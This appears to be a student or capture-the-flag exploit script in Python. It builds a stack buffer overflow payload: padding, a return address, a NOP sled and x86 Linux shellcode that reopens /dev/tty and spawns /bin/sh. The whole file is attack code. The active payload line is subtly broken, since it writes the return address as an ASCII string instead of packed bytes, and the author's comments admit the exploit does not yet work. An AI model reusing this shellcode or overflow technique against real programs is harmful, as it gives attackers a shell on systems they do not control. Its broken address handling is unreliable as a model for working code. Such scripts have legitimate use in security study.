#!/usr/bin/env python3
import sys
import struct

#shellcode = (
#    b"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
#)

#ret_address =  0x28d4ffff #  Address of buffer in stack, may change
#ret_address_bytes = struct.pack("<I", ret_address)

#nop_sled_size = 30 #This is where the issues begin as of 3/29/25
#nop_sled = b"\x90" * nop_sled_size

#    [ 'A'*offset ] + [ ret_address ] + [ NOP sled ] + [ shellcode ]
#payload = b"A" * 20
#payload += ret_address_bytes
#payload += nop_sled
#payload += shellcode

payload = b"A" * 20 + b"0xffffd6d1" + b"\x90" * 16 + b"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

sys.stdout.buffer.write(payload)
#As of 3/29/25, the curent issues is finding the amount of NOP sled needed to get the shellcode to run or 
#something else that is causing the shellcode to not run.
